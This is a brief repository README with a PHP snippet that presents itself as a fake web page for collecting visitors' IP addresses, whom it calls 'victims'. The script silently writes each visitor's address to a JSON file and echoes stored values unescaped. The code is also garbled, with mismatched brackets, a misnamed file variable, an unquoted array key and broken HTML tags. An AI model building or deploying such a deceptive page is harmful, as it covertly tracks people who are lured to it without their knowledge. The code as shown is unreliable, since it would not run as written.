# PHP-FAKE-PAGE.-IP
Is a fake web page to get the ip from victims


<body> 

<?php
$file_with_ips = 'ip.json';
$ips = file_get_contents($file_with_ips);
$contenido = json_decode($ips,true); 

If(isset($_GET["mostrar"])){
  Echo  "<p>ip: <b>" .$contenido[$_GET["k"]] ."<
b><";
} 

else{
$contenido["k"]]  =  $_SERVER[REMOTE_ADDR];
file_put_contents($file_file_with_ips,  json_encode($contenido)); 

} 

    ?>
